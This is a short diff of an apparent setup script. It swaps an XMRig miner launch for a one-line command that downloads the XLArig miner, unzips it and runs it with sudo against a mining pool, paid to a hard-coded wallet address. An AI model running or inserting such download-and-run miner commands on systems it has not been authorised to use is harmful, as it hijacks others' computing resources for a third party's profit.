@@ -1,5 +1,2 @@
 apt update
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.0/xmrig-6.12.0-linux-x64.tar.gz
-tar xf xmrig-6.12.0-linux-x64.tar.gz
-cd xmrig-6.12.0
-./xmrig -o upx.miningocean.org:4342 -u UPX1emR5rWrXGgsmzrdW68dEJcGgUPcX3ho2vf6XMuYBAHz2UzZpDuvcnyoG4QEZfM3DtT2cbT2FJ6W88vDAzRDN7aBJzBXG2G -p agiz1 -t 25 -a cn/upx2 -k
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && sudo ./xlarig -o mine.scalaproject.io:5555 -u Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic -p agiz1 -a panthera -k
